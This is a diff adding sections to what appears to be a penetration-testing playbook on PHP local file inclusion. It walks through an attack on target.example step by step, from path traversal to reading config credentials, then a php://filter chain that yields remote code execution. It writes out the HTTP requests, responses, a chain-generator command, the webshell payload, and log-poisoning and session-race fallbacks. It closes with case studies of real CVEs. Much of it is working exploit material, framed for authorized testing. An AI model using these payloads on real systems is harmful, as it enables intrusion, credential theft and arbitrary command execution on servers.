@@ -348,6 +348,59 @@ Use it:
 ```
 > **If this → then that:** PHP **include** sink but no log access, no upload, `allow_url_include=Off` → the **filter-chain** is your RCE: it needs only the single LFI parameter and no writable location. It's the go-to modern technique when log/session poisoning is unavailable. (Generate the chain with the bundled script.)
 
+## 12.1 The full attack, end-to-end — traversal → classify include-vs-read → `php://filter` chain → RCE (worked transcript) ⭐
+
+> *This is the flagship worked example* — the modern, LFI-distinct money move: turn a file-read into RCE **with no file write, no log, no upload, and `allow_url_include=Off`**. It also shows the one classification that decides your whole ceiling (does the sink *include* or merely *read*?). Own instance / authorized target; benign marker, then stop.
+
+**Target.** `target.example` has `GET /?page=home` → `include("pages/" . $_GET['page'] . ".php")` (a suffix is appended). PHP/Apache. Goal: prove the ceiling, not just read `/etc/passwd`.
+
+**Step 1 — confirm traversal, beat the forced suffix (§5/§6).** The `.php` suffix is appended, so a raw path won't resolve; a PHP wrapper ignores the suffix. First just prove I can escape the directory by reading a known file via the base64 wrapper:
+```http
+GET /?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd HTTP/1.1
+Host: target.example
+```
+```
+HTTP/1.1 200 OK
+cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...       # base64 of /etc/passwd
+```
+`base64 -d` → `root:x:0:0:root:/bin/bash…`. **Traversal confirmed** — but `/etc/passwd` is only a *Medium* proof (§17.2). The far more important thing this response just told me is in Step 2.
+
+**Step 2 — the decisive classification: does the sink INCLUDE or just READ? (§4.2).** The fact that `php://filter/convert.base64-encode/…` **returned a transformed (base64) blob** proves the sink **evaluates PHP wrappers** — i.e. it's a real `include()`/`require()`, not a `file_get_contents()` that would have echoed the raw wrapper string. That single observation sets the ceiling to **RCE**. Confirm by pulling the app's own source (a genuine High finding on its own — leaks DB creds/secrets):
+```http
+GET /?page=php://filter/convert.base64-encode/resource=../config HTTP/1.1
+```
+```
+HTTP/1.1 200 OK
+PD9waHAgJGRiX3Bhc3M9InN1cGVyLXNlY3JldCI7...          # base64 of config.php → decodes to $db_pass="super-secret";
+```
+Source disclosure in hand, and — crucially — an **include sink that runs wrappers**. Now escalate read → exec.
+
+**Step 3 — synthesize PHP from nothing: the filter chain (no write). ⭐** There's no log I can reach, no upload, and `allow_url_include=Off`, so `data://`/remote (§14/RFI) are out. The filter chain manufactures the payload **inside the `php://filter` string itself** — stacking `iconv`/base64 conversion filters so the bytes emerging at the end of the assembly line *are* the PHP I want. Generate it:
+```bash
+$ python3 poc/filter_chain_rce.py --cmd id
+# drives synacktiv's php_filter_chain_generator.py; emits a long php://filter/...|convert.iconv... chain
+# whose decoded output is:  <?php system($_GET['c']); ?>
+[+] chain: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|... (≈14 KB) ...|resource=php://temp
+```
+
+**Step 4 — include the chain → RCE, benign marker only.** The chain is ~14 KB, so I put it in the **query string** (not a header — default Apache caps headers at 8 KB, which would truncate it):
+```http
+GET /?page=php://filter/convert.iconv.UTF8...(≈14KB chain)...resource=php://temp&c=id HTTP/1.1
+Host: target.example
+```
+```
+HTTP/1.1 200 OK
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+**`uid=33(www-data)` — command execution.** The included "file" was pure PHP synthesized on the fly from the one LFI parameter; nothing was ever written to disk. That is the Critical: not "I read `/etc/passwd`," but *arbitrary commands as the web user*. One benign command (`id`), then STOP — no shell, no persistence (§21).
+
+**Step 5 — the fallbacks, in order (so you're never stuck).**
+- **Log poisoning (§11)** — if the sink includes but a filter chain is blocked (WAF on `php://filter`) and a **web/SSH log is readable+poisonable**: `User-Agent: <?php system($_GET['c']);?>` → include `…/access.log&c=id`.
+- **`session.upload_progress` (§13)** — include sink + session dir but no reflected field: POST `PHP_SESSION_UPLOAD_PROGRESS=<?php…?>` and **race** the include of `sess_<ID>`.
+- **Pure-READ sink (not include)** — if Step 2 had returned the *raw* `php://filter` string (no transform), the sink is `file_get_contents`-class → **no RCE via wrappers**; pivot to the **error-based filter-chain oracle** to leak files char-by-char, and treat it as a disclosure finding (or hand off to the PathTraversal kit for read-without-include).
+
+**Why this is the LFI-defining escalation.** Every other RCE path needs *somewhere to write* (a log, a session, an upload) or *remote fetch* (RFI). The filter chain needs **neither** — only that the include sink evaluates `php://filter`, which Step 2's base64 round-trip already proved. Read → source disclosure → RCE, from a single parameter.
+
 ---
 
 # 13. LFI → RCE: Session-File & `/proc` Poisoning
@@ -471,6 +524,20 @@ The path you supply isn't included immediately — it's **stored** (a profile fi
 3. The stored payload is included → file read / RCE in that (often higher-priv) context.
 ```
 > **If this → then that:** a value you control is **stored and later used as a path** (theme/template/locale/filename) → second-order LFI. It often fires in a **back-office/worker/admin** context with broader filesystem access → higher impact than a reflected LFI. Plant the payload, then trigger the consumer and watch for the read/RCE (or an OOB hit for a wrapper).
+
+---
+
+# 16.5 Real-world LFI / file-inclusion case studies (verified)
+
+> Re-verified against primary sources (linked in the references appendix) — the named research and CVEs behind the techniques above.
+
+- **PHP filter-chain RCE — the technique that made "read-only LFI" obsolete (Synacktiv, 2022; building on Gynvael Coldwind).** Synacktiv's *"PHP filters chain: What is it and how to use it"* and the accompanying **`php_filter_chain_generator`** turned a decades-old curiosity into a universal weapon: if you **fully control the parameter passed to `include`/`require`**, you can synthesize arbitrary PHP — e.g. `<?php system($_GET['c']);?>` — by chaining `iconv`/base64 conversion filters, **with no file write, no upload, no log, and `allow_url_include=Off`** (§12/§12.1). The known constraint is payload size (~14 KB), which the default Apache 8 KB **header** limit truncates — so the chain goes in the query/body, not a header. There's also an **error-based oracle** variant (`php_filter_chains_oracle_exploit`) that leaks file contents when the sink is a *read* (`file_get_contents`/`file`/`copy`) rather than an include. Lesson: on any PHP include sink, the filter chain is the modern first-choice RCE; on a read sink, the oracle still exfiltrates files.
+
+- **CVE-2021-41773 & CVE-2021-42013 — Apache path traversal → RCE, exploited in the wild as a 0-day (Oct 2021).** Apache HTTP Server **2.4.49** shipped a path-traversal flaw (**41773**) letting `..%2e/`-style requests map URLs outside the `Alias`-configured roots → arbitrary file disclosure; when **`mod_cgi` was enabled**, the same primitive invoked `/bin/sh` → **RCE as the Apache user**. The 2.4.50 fix was **incomplete** (double-encoding bypass) → **CVE-2021-42013**; fully fixed in 2.4.51. Apache confirmed in-the-wild exploitation, and public PoCs appeared within hours. This is the §16.3 lesson made concrete: **the traversal bug is sometimes in the *server*, not the app** — and encoded-traversal (`%2e%2e`, double-encoding) is exactly the §7 bypass family. A tester should always try server-level traversal, not just app parameters.
+
+- **Log poisoning — the classic, still-reliable LFI→RCE (OWASP / HackTricks canon).** The oldest escalation remains a staple: when an include sink can reach a **readable, attacker-writable log** (`access.log`, `error.log`, SSH `auth.log`, mail log), you plant `<?php system($_GET['c']);?>` in a logged field (User-Agent or the request line) and include the log to execute it (§11). It predates the filter chain and is often the *only* path when `php://filter` is WAF-blocked — which is why §12.1's fallback ladder lists it first. It's a reminder that LFI's RCE ceiling comes from finding *anywhere* the server will both store your bytes and later evaluate them.
+
+- **Why LFI's severity is decided by one word: include vs. read.** The through-line of every case above is §4.2's classification. A sink that merely *reads* (`file_get_contents`, `readfile`, a download endpoint) tops out at **file/secret disclosure** — real, but Medium–High (and often the PathTraversal kit's territory). A sink that *includes* (`include`/`require`, evaluating PHP wrappers) is **RCE-capable** via filter chain / log / session / wrapper. The base64 round-trip in §12.1 Step 2 is the cheapest way to tell them apart, and it's the single most important observation you can make on an LFI.
 
 ---
 
